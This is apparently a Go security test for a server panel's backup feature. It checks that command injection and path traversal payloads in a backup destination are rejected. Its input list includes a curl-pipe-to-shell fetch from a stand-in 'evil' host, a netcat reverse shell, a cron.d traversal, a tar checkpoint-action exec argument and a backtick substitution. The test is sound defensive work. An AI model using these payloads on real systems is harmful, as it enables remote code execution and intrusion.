package securitytest

import (
	"testing"

	"github.com/hitechcloud-vietnam/vkai-panel/internal/config"
	"github.com/hitechcloud-vietnam/vkai-panel/internal/utils"
)

// The backup destination used to be interpolated into `bash -c "... > %s"`.
// These are the payloads from that exploit path; each must be refused before it
// can reach any command.
func TestBackupDestinationValidation(t *testing.T) {
	root := config.BackupRoot()
	bad := []string{
		"/tmp/$(curl -s http://evil/x.sh|sh)",
		"/tmp/a; nc -e /bin/sh evil 4444 #",
		root + "/../../etc/cron.d/pwn",
		"/etc/cron.d/pwn",
		"--checkpoint-action=exec=sh",
		"relative/path",
		root + "/`id`",
	}
	for _, d := range bad {
		if err := utils.ValidateAbsolutePath(d, "destination"); err != nil {
			continue
		}
		if _, err := utils.EnsureWithinRoot(root, d); err == nil {
			t.Errorf("destination accepted: %q", d)
		}
	}

	good := root + "/nightly"
	if err := utils.ValidateAbsolutePath(good, "destination"); err != nil {
		t.Fatalf("legitimate destination rejected: %v", err)
	}
	if _, err := utils.EnsureWithinRoot(root, good); err != nil {
		t.Fatalf("legitimate destination rejected: %v", err)
	}
}
